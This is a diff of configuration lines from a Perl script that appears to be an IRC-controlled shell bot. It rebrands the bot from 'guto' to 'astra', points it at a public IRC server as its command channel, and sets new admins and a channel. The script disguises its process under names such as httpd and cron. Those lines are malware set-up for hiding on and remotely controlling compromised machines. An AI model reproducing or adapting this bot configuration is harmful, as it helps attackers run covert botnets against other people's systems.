@@ -22,21 +22,21 @@ my @rps = ("/usr/local/apache/bin/httpd",
            "/usr/sbin/cron");
 
 my $process = $rps[rand scalar @rps];
-my @rversion = ("guto");
+my @rversion = ("astra");
 my $vers = $rversion[rand scalar @rversion];
-my @rircname = ("guto-bot");
+my @rircname = ("astra-bot");
 my $ircname = $rircname[rand scalar @rircname];
 chop (my $realname = $rircname[rand scalar @rircname]);
 my $nick =$rircname[rand scalar @rircname];
-my $server = 'bender.us.utonet.org';
+my $server = 'irc.freenode.net';
 my $port = '6667';
 my $linas_max='8';
 my $sleep='5';
 my $homedir = "/tmp";
 my $version = 'v.02';
-my @admins = ("reiy");
+my @admins = ("ASTRA_");
 #my @hostauth = ("gov");
-my @channels = ("#reiy1337");
+my @channels = ("#astra");
 my $pacotes = 1;
 
 #################################################################
